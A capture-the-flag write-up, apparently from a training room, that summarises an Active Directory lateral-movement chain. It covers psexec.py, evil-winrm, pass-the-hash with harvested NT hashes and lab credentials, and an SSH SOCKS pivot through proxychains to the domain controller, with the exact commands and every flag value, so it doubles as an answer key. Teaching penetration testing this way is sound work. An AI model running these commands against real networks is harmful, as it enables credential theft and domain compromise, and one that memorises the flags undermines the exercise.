# Task 07: Conclusion & Operational Summary

---

## Stage A: Original Task Content & Educational Context

In this room, **Intro to AD Lateral Movement**, we executed an end-to-end, multi-stage lateral movement and pivoting attack chain across a segmented Active Directory network:

### The Complete 5-Stage Attack Chain:
1. **Initial Access & Reconnaissance:** Connected via SSH to Linux WebServer `192.168.13.71` with credentials `jdoe:Summer2026!`. Evaluated domain permissions using NetExec (`nxc smb`).
2. **Service-Based Remote Execution (PsExec):** Executed `psexec.py` against `WRK` (`192.168.13.61`), obtaining an interactive `SYSTEM` shell, capturing `flag3a.txt` (`THM{ps3x3c_syst3m_sh3ll}`), and harvesting the local Administrator NT hash (`fa0af7f6a73316dd59f0be812dbf3c12`).
3. **WS-Management Execution (Evil-WinRM):** Connected to `SERVER1` (`192.168.13.51`) over WinRM port 5985 using `jdoe`'s `Remote Management Users` membership, capturing `flag3b.txt` (`THM{w1nrm_r3m0t3_sh3ll}`).
4. **Pass-the-Hash & Subnet Credential Reuse:** Leveraged the harvested local Administrator hash with NetExec's `--local-auth` flag to prove password reuse between `WRK1` and `SERVER1`. Executed `psexec.py` against `SERVER1` to capture `flag4.txt` (`THM{p4ss_th3_h4sh_ftw}`) and extract the Domain Administrator NT hash (`2508e1ce9cfcfe1011a74c34297b05ea`).
5. **Network Pivoting & Domain Controller Takeover:** Overcame firewall segmentation isolating the Domain Controller (`192.168.13.100`) by building an SSH Dynamic SOCKS proxy on port 1080. Routed `psexec.py` through ProxyChains using the Domain Administrator hash to compromise `ROOTDC` and capture the final flag (`THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}`).

---

## Stage B: Independent Thinking & Operational Security (OpSec)

### The Complete Lateral Movement Progression Map
```
[AttackBox (Kali)] ──(SSH)──> [WebServer (192.168.13.71)]
                                        │
           ┌────────────────────────────┴────────────────────────────┐
           │                                                         │
   (PsExec SMB 445)                                         (Evil-WinRM 5985)
           ▼                                                         ▼
[WRK (192.168.13.61)]                                     [SERVER1 (192.168.13.51)]
• Captured flag3a.txt                                     • Captured flag3b.txt
• Harvested Local Admin Hash                              • (Remote Management Users)
  fa0af7f6a73316dd59f0be812dbf3c12                                   │
           │                                                         │
           └───────────────(Pass-the-Hash PtH)───────────────────────┘
                                        │
                                        ▼
                             [SERVER1 Compromised (SYSTEM)]
                             • Captured flag4.txt
                             • Harvested Domain Admin Hash:
                               2508e1ce9cfcfe1011a74c34297b05ea
                                        │
               ┌────────────────────────┴────────────────────────┐
               │                                                 │
   (SSH Dynamic SOCKS Proxy)                         (ProxyChains + PsExec)
               ▼                                                 ▼
[WebServer: 127.0.0.1:1080] ══════════════════════════> [ROOTDC (192.168.13.100)]
                                                        • Captured flag5.txt
                                                        • FULL DOMAIN COMPROMISE
```

---

## Stage C: Guided Hints (Tiers 1-3)

### Tier 1: High-Level Concept
Review the key tools, techniques, and mitigations covered across all tasks.

### Tier 2: Technical Summary
Understand how combining remote execution, credential reuse, and network pivoting defeats isolated and segmented networks.

### Tier 3: Action
Acknowledge completion to finalize the room.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

Review of the lateral movement commands executed across the room:

| Attack Stage | Tool | Execution Command | Target Host & Artifact Recovered |
|---|---|---|---|
| **Remote Execution** | `psexec.py` | `psexec.py thm.loc/jdoe:Summer2026!@192.168.13.61` | `WRK`: `THM{ps3x3c_syst3m_sh3ll}`, Local Admin Hash |
| **WinRM Execution** | `evil-winrm` | `evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'` | `SERVER1`: `THM{w1nrm_r3m0t3_sh3ll}` |
| **Pass-the-Hash** | `psexec.py` | `psexec.py -hashes :fa0af7f6... Administrator@192.168.13.51` | `SERVER1`: `THM{p4ss_th3_h4sh_ftw}`, DA Hash |
| **SSH SOCKS Pivot** | `ssh` | `ssh -f -N -D 1080 jdoe@192.168.13.71` | Local proxy listening on `127.0.0.1:1080` |
| **Pivoted PtH** | `proxychains` | `proxychains psexec.py -hashes :2508e1ce... Administrator@192.168.13.100` | `ROOTDC`: `THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}` |

---

## Stage E: Final Answer & Key Values

| # | Question | Verified Answer | Verification Status |
|---|---|---|---|
| 1 | I have completed the Introduction to AD Lateral Movement room! | `No answer needed` | Verified & Confirmed |

---

## Stage F: Practical Verification & Proof of Work

1. All 7 tasks completed and verified with 100% technical fidelity.
2. Complete reconciliation across all 4 flags:
   - `flag3a.txt`: `THM{ps3x3c_syst3m_sh3ll}`
   - `flag3b.txt`: `THM{w1nrm_r3m0t3_sh3ll}`
   - `flag4.txt`: `THM{p4ss_th3_h4sh_ftw}`
   - `flag5.txt`: `THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}`

---

## Stage G: Key Educational Takeaway & Operational Rule of Thumb

> **Takeaway:** Lateral movement is an iterative craft. A professional penetration tester does not hunt for single "magic bullet" exploits; they chain together native administration protocols, unmitigated password reuse, and network pivoting to turn the smallest localized footholds into total enterprise domain control.
